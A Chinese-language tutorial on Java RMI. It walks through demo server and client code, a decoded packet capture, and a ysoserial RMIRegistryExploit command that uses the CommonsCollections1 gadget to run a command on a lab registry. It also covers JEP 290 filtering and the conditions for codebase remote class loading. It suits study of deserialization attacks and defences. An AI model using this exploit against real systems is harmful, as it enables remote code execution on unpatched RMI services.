## Remote Method Invocation RMI

功能上和RPC类似。也就是让一个JVM内的对象可以调用另一个JVM内的对象方法和属性。分为rmi server和client

- 一个RMI Server的例子
 - 继承java.rmi.Remote接口的接口，在接口中定义提供被调用的方法
 - 实现这个接口的类
 - 一个用于创建服务绑定IP和PORT的主类，也就是Server：实例化编写的RMI类，绑定对象到HelloWorld

```java
public class RMIServerDemo {

    public interface IMyRemoteHelloWorld extends Remote {

        public String sayHello() throws RemoteException;
    }

    public class MyRemoteHelloWorld extends UnicastRemoteObject implements IMyRemoteHelloWorld{

        public String sayHello() throws RemoteException {
            System.out.println("called......");
            return "Hello World";
        }
    }

    public void start() throws RemoteException, MalformedURLException {
        MyRemoteHelloWorld myRemoteHelloWorld = new MyRemoteHelloWorld();
        LocateRegistry.createRegistry(8086);
        Naming.rebind("rmi://127.0.0.1:8086/HelloWorld",myRemoteHelloWorld);
    }

    public static void main(String[] args) throws Exception{
        new RMIServerDemo().start();
    }
}
```


一个 RMI Client例子
 - Naming.lookup()方法在地址中通过HelloWorld得到RMI处理类对象
 - 调用对象执行sayHello()方法

```java
public class RMIClientDemo {

    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException {
        RMIServerDemo.IMyRemoteHelloWorld h = (RMIServerDemo.IMyRemoteHelloWorld) Naming.lookup("rmi://127.0.0.1:8086/HelloWorld");
        String res = h.sayHello();
        System.out.println(res);
    }
}
```

> 这里server和远程client都需要用到IMyRemoteHelloWorld接口。
Naming.bind()在服务端绑定一个remote实例到jndi地址，RMI客户端使用服务端执行操作时会返回这个实例的引用

### 2021更新

首先是 ,在RMI远程调用中需要涉及到调用方法的参数和返回结果的传输,这些参数和return可能是基本类型,也有可能会是某一个对象的引用,整个过程中需要被传输的对象都必须可以被序列化,并且client和server的jvm环境中的类必须实现serializable接口和serialVersionUID保持一致.


## RMI通信

![path](https://nanazeven.github.io/image/rmi_1.png)

执行一次远程RMI调用创建了两个TCP连接

#### NO.225号-228号数据包是第一个tcp连接，由端口61734->8086

#### NO.229号-234号数据包是关于RMI连接相关的版本确认什么的 不向这深究

#### NO.235号数据包 客户端向jndi查询HelloWorld的对象,包含一个aced反序列化数据，解码后是HelloWorld字符串

```
0000   02 00 00 00 45 00 00 6a 00 00 40 00 40 06 00 00   ....E..j..@.@...
0010   c0 a8 08 6b c0 a8 08 6b f1 26 1f 96 a0 71 9d 46   ...k...k.&...q.F
0020   3c 7c 22 ee 80 18 18 eb 92 83 00 00 01 01 08 0a   <|".............
0030   2c f3 1c da 2c f3 1c d3 50 ac ed 00 05 77 22 00   ,...,...P....w".
0040   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0050   00 00 00 00 00 00 00 00 02 44 15 4d c9 d4 e6 3b   .........D.M...;
0060   df 74 00 0a 48 65 6c 6c 6f 57 6f 72 6c 64         .t..HelloWorld

SerializationDumper git:(master) java -jar SerializationDumper-v1.13.jar aced00057722000000000000000000000000000000000000000000000000000244154dc9d4e63bdf74000a48656c6c6f576f726c64

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_BLOCKDATA - 0x77
    Length - 34 - 0x22
    Contents - 0x000000000000000000000000000000000000000000000000000244154dc9d4e63bdf
  TC_STRING - 0x74
    newHandle 0x00 7e 00 00
    Length - 10 - 0x00 0a
    Value - HelloWorld - `0x48656c6c6f576f726c64`
```

#### NO.237号数据包 服务器返回一个基于`IMyRemoteHelloWorld`接口的动态代理Proxy对象

对象的h属性为`RemoteObjectInvocationHandler`类，这个对象的objectAnnotation属性存放HelloWorld对应的远程对象在远程RMI服务器的地址和端口存放在0x000a556e6963617374526566000d3139322e3136382e382e3130370000fec9e6f44498ddd89ea2f5ea79f10000017543c9ebc9800101


其中 `0x0000fec9是端口号`：`struct.unpack('>I',b'\x00\x00\xfe\xc9')`输出(`65225`,)

```
0000   02 00 00 00 45 00 01 82 00 00 40 00 40 06 00 00   ....E.....@.@...
0010   c0 a8 08 6b c0 a8 08 6b 1f 96 f1 26 3c 7c 22 ee   ...k...k...&<|".
0020   a0 71 9d 7c 80 18 18 ea 93 9b 00 00 01 01 08 0a   .q.|............
0030   2c f3 1c da 2c f3 1c da 51 ac ed 00 05 77 0f 01   ,...,...Q....w..
0040   f5 ea 79 f1 00 00 01 75 43 c9 eb c9 80 17 73 7d   ..y....uC.....s}
0050   00 00 00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52   ......java.rmi.R
0060   65 6d 6f 74 65 00 25 72 6d 69 2e 52 4d 49 53 65   emote.%rmi.RMISe
0070   72 76 65 72 44 65 6d 6f 24 49 4d 79 52 65 6d 6f   rverDemo$IMyRemo
0080   74 65 48 65 6c 6c 6f 57 6f 72 6c 64 70 78 72 00   teHelloWorldpxr.
0090   17 6a 61 76 61 2e 6c 61 6e 67 2e 72 65 66 6c 65   .java.lang.refle
00a0   63 74 2e 50 72 6f 78 79 e1 27 da 20 cc 10 43 cb   ct.Proxy.'. ..C.
00b0   02 00 01 4c 00 01 68 74 00 25 4c 6a 61 76 61 2f   ...L..ht.%Ljava/
00c0   6c 61 6e 67 2f 72 65 66 6c 65 63 74 2f 49 6e 76   lang/reflect/Inv
00d0   6f 63 61 74 69 6f 6e 48 61 6e 64 6c 65 72 3b 70   ocationHandler;p
00e0   78 70 73 72 00 2d 6a 61 76 61 2e 72 6d 69 2e 73   xpsr.-java.rmi.s
00f0   65 72 76 65 72 2e 52 65 6d 6f 74 65 4f 62 6a 65   erver.RemoteObje
0100   63 74 49 6e 76 6f 63 61 74 69 6f 6e 48 61 6e 64   ctInvocationHand
0110   6c 65 72 00 00 00 00 00 00 00 02 02 00 00 70 78   ler...........px
0120   72 00 1c 6a 61 76 61 2e 72 6d 69 2e 73 65 72 76   r..java.rmi.serv
0130   65 72 2e 52 65 6d 6f 74 65 4f 62 6a 65 63 74 d3   er.RemoteObject.
0140   61 b4 91 0c 61 33 1e 03 00 00 70 78 70 77 36 00   a...a3....pxpw6.
0150   0a 55 6e 69 63 61 73 74 52 65 66 00 0d 31 39 32   .UnicastRef..192
0160   2e 31 36 38 2e 38 2e 31 30 37 00 00 fe c9 e6 f4   .168.8.107......
0170   44 98 dd d8 9e a2 f5 ea 79 f1 00 00 01 75 43 c9   D.......y....uC.
0180   eb c9 80 01 01 78                                 .....x

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_BLOCKDATA - 0x77
    Length - 15 - 0x0f
    Contents - 0x01f5ea79f10000017543c9ebc98017
  TC_OBJECT - 0x73
    TC_PROXYCLASSDESC - 0x7d
      newHandle 0x00 7e 00 00
      Interface count - 2 - 0x00 00 00 02
      proxyInterfaceNames
        0:
          Length - 15 - 0x00 0f
          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465
        1:
          Length - 37 - 0x00 25
          Value - rmi.RMIServerDemo$IMyRemoteHelloWorld - 0x726d692e524d4953657276657244656d6f24494d7952656d6f746548656c6c6f576f726c64
      classAnnotations
        TC_NULL - 0x70
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_CLASSDESC - 0x72
          className
            Length - 23 - 0x00 17
            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879
          serialVersionUID - 0xe1 27 da 20 cc 10 43 cb
          newHandle 0x00 7e 00 01
          classDescFlags - 0x02 - SC_SERIALIZABLE
          fieldCount - 1 - 0x00 01
          Fields
            0:
              Object - L - 0x4c
              fieldName
                Length - 1 - 0x00 01
                Value - h - 0x68
              className1
                TC_STRING - 0x74
                  newHandle 0x00 7e 00 02
                  Length - 37 - 0x00 25
                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b
          classAnnotations
            TC_NULL - 0x70
            TC_ENDBLOCKDATA - 0x78
          superClassDesc
            TC_NULL - 0x70
    newHandle 0x00 7e 00 03
    classdata
      java.lang.reflect.Proxy
        values
          h
            (object)
              TC_OBJECT - 0x73
                TC_CLASSDESC - 0x72
                  className
                    Length - 45 - 0x00 2d
                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572
                  serialVersionUID - 0x00 00 00 00 00 00 00 02
                  newHandle 0x00 7e 00 04
                  classDescFlags - 0x02 - SC_SERIALIZABLE
                  fieldCount - 0 - 0x00 00
                  classAnnotations
                    TC_NULL - 0x70
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_CLASSDESC - 0x72
                      className
                        Length - 28 - 0x00 1c
                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374
                      serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e
                      newHandle 0x00 7e 00 05
                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE
                      fieldCount - 0 - 0x00 00
                      classAnnotations
                        TC_NULL - 0x70
                        TC_ENDBLOCKDATA - 0x78
                      superClassDesc
                        TC_NULL - 0x70
                newHandle 0x00 7e 00 06
                classdata
                  java.rmi.server.RemoteObject
                    values
                    objectAnnotation
                      TC_BLOCKDATA - 0x77
                        Length - 54 - 0x36
                        Contents - 0x000a556e6963617374526566000d3139322e3136382e382e3130370000fec9e6f44498ddd89ea2f5ea79f10000017543c9ebc9800101
                      TC_ENDBLOCKDATA - 0x78
                  java.rmi.server.RemoteObjectInvocationHandler
                    values
      <Dynamic Proxy Class>
```

#### NO.239-242号数据包是由客户端61735到rmiserver65225的tcp连接建立过程

#### NO.249号数据包，client远程调用请求数据包


```
0000   02 00 00 00 45 00 01 f7 00 00 40 00 40 06 00 00   ....E.....@.@...
0010   c0 a8 08 6b c0 a8 08 6b f1 27 fe c9 56 39 68 8d   ...k...k.'..V9h.
0020   9d f9 13 bb 80 18 18 eb 94 10 00 00 01 01 08 0a   ................
0030   2c f3 1d 30 2c f3 1d 2a 50 ac ed 00 05 77 22 00   ,..0,..*P....w".
0040   00 00 00 00 00 00 02 00 00 00 00 00 00 00 00 00   ................
0050   00 00 00 00 00 00 00 00 01 f6 b6 89 8d 8b f2 86   ................
0060   43 75 72 00 18 5b 4c 6a 61 76 61 2e 72 6d 69 2e   Cur..[Ljava.rmi.
0070   73 65 72 76 65 72 2e 4f 62 6a 49 44 3b 87 13 00   server.ObjID;...
0080   b8 d0 2c 64 7e 02 00 00 70 78 70 00 00 00 01 73   ..,d~...pxp....s
0090   72 00 15 6a 61 76 61 2e 72 6d 69 2e 73 65 72 76   r..java.rmi.serv
00a0   65 72 2e 4f 62 6a 49 44 a7 5e fa 12 8d dc e5 5c   er.ObjID.^.....\
00b0   02 00 02 4a 00 06 6f 62 6a 4e 75 6d 4c 00 05 73   ...J..objNumL..s
00c0   70 61 63 65 74 00 15 4c 6a 61 76 61 2f 72 6d 69   pacet..Ljava/rmi
00d0   2f 73 65 72 76 65 72 2f 55 49 44 3b 70 78 70 e6   /server/UID;pxp.
00e0   f4 44 98 dd d8 9e a2 73 72 00 13 6a 61 76 61 2e   .D.....sr..java.
00f0   72 6d 69 2e 73 65 72 76 65 72 2e 55 49 44 0f 12   rmi.server.UID..
0100   70 0d bf 36 4f 12 02 00 03 53 00 05 63 6f 75 6e   p..6O....S..coun
0110   74 4a 00 04 74 69 6d 65 49 00 06 75 6e 69 71 75   tJ..timeI..uniqu
0120   65 70 78 70 80 01 00 00 01 75 43 c9 eb c9 f5 ea   epxp.....uC.....
0130   79 f1 77 08 80 00 00 00 00 00 00 00 73 72 00 12   y.w.........sr..
0140   6a 61 76 61 2e 72 6d 69 2e 64 67 63 2e 4c 65 61   java.rmi.dgc.Lea
0150   73 65 b0 b5 e2 66 0c 4a dc 34 02 00 02 4a 00 05   se...f.J.4...J..
0160   76 61 6c 75 65 4c 00 04 76 6d 69 64 74 00 13 4c   valueL..vmidt..L
0170   6a 61 76 61 2f 72 6d 69 2f 64 67 63 2f 56 4d 49   java/rmi/dgc/VMI
0180   44 3b 70 78 70 00 00 00 00 00 09 27 c0 73 72 00   D;pxp......'.sr.
0190   11 6a 61 76 61 2e 72 6d 69 2e 64 67 63 2e 56 4d   .java.rmi.dgc.VM
01a0   49 44 f8 86 5b af a4 a5 6d b6 02 00 02 5b 00 04   ID..[...m....[..
01b0   61 64 64 72 74 00 02 5b 42 4c 00 03 75 69 64 71   addrt..[BL..uidq
01c0   00 7e 00 03 70 78 70 75 72 00 02 5b 42 ac f3 17   .~..pxpur..[B...
01d0   f8 06 08 54 e0 02 00 00 70 78 70 00 00 00 08 f3   ...T....pxp.....
01e0   a8 66 75 b8 97 8c d8 73 71 00 7e 00 05 80 01 00   .fu....sq.~.....
01f0   00 01 75 44 a4 23 a0 d3 07 64 d7                  ..uD.#...d.

```





## 利用

- 攻击的两种情况
 - 可以访问到JNDI的RMI服务,RMI Registry
 - 可以控制客户端的lookup方法的参数 

### 可以访问RMI Registry

由于Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、bind、unbind等方法。

所以我们可以调用list方法查看Registry上存在对象，看看有没有危险的对象可以利用

#### ysoserial RMIRegistryExploit

使用反序列化攻击RMI的server端,这里的server端可以包含两种端口,一个是RMI Registry,另一个是存放注册在上面的远程对象,因为一般情况下这两种端口在一台服务器上

可以是使用registry的list,lookup方法获取注册在Registry上的remote对象,确定参数类型后,写一个和参数类名包名相同的类,然后用gadget类继承去欺骗romote反序列化.

另一种可以使用 ysoserial的RMIRegistryExploit去直接攻击Registry注册中心:


首先简单搭建RMI的server环境,jdk的版本是1.7u17

```java
public class rmiServer {

    public static void main(String[] args) throws Exception {
        ownMessage obj = new ownMessageImpl();
        ownMessage om = (ownMessage) UnicastRemoteObject.exportObject(obj, 0);
        Registry reg = LocateRegistry.createRegistry(11111);
        reg.bind("sendMessage", om);

    }
}
```

其次引入gadget需要的环境:

```xml
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
```

切到ysoserial的jar包目录下使用`RMIRegistryExploit`进行攻击:

```shell
java -cp ./ysoserial-master-4df2ee2bb5-1.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 11111 CommonsCollections1 "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
```
成功执行命令,接着把jdk版本切换到1.8u251,重新启动rmiServer,并且重新执行上面的命令,结果为报错:

```text

java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
	java.io.InvalidClassException: filter status: REJECTED
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:389)
	at sun.rmi.transport.Transport$1.run(Transport.java:200)
	at sun.rmi.transport.Transport$1.run(Transport.java:197)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
	at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
	at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
	at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:379)
	at sun.rmi.registry.RegistryImpl_Stub.bind(RegistryImpl_Stub.java:73)
	at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:77)
	at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:71)
	at ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72)
	at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:71)
	at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:65)
Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
	java.io.InvalidClassException: filter status: REJECTED
	at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:94)
	at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:469)
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:301)
	at sun.rmi.transport.Transport$1.run(Transport.java:200)
	at sun.rmi.transport.Transport$1.run(Transport.java:197)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
Caused by: java.io.InvalidClassException: filter status: REJECTED
	at java.io.ObjectInputStream.filterCheck(ObjectInputStream.java:1288)
	at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1934)
	at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1807)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2098)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1624)
	at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2343)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2267)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2125)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1624)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:464)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422)
	at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:91)
	... 14 more
```

明显爆出了filter status: REJECTED,控制台也爆出是`AnnotationInvocationHandler`被拦截了:

```text
java.io.ObjectInputStream filterCheck
信息: ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs: 8, depth: 2, bytes: 298, ex: n/a
```

原因是`1.8u121`之后`RMIRegistryImpl.registryFilter()`做了限制:白名单限制反序列化的类

JEP 290,官方从8u121，7u131，6u141分别支持了这个JEP:

- 提供一个限制反序列化类的机制，白名单或者黑名单
- 限制反序列化的深度和复杂度
- 为RMI远程调用对象提供了一个验证类的机制
- 定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器

```java
private static Status registryFilter(FilterInfo var0) {
        if (registryFilter != null) {
            Status var1 = registryFilter.checkInput(var0);
            if (var1 != Status.UNDECIDED) {
                return var1;
            }
        }

        if (var0.depth() > 20L) {
            return Status.REJECTED;
        } else {
            Class var2 = var0.serialClass();
            if (var2 != null) {
                if (!var2.isArray()) {
                    return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
                } else {
                    return var0.arrayLength() >= 0L && var0.arrayLength() > 1000000L ? Status.REJECTED : Status.UNDECIDED;
                }
            } else {
                return Status.UNDECIDED;
            }
        }
    }
```

#### Java RMI的codebase动态加载类

可以使用codebase去远程加载class文件,在java rmi通信流程中通过设置`java.rmi.server.codebase`的值为远程class所在的uri

而且整个流程codebase的值可以由客户端控制的,但是有一定的利用条件:

- 安装并配置了SecurityManager

- Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置为true

- 被引用的对象还将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，如果该值为false(不信任远程引用对象)一样无法调用远程的引用对象。
 
 - JDK 6u132, JDK 7u122, JDK 8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false
SecurityManager决定服务端可不可以远程加载class,useCodebaseOnly为false决定了服务端可以从客户端的codebase加载class

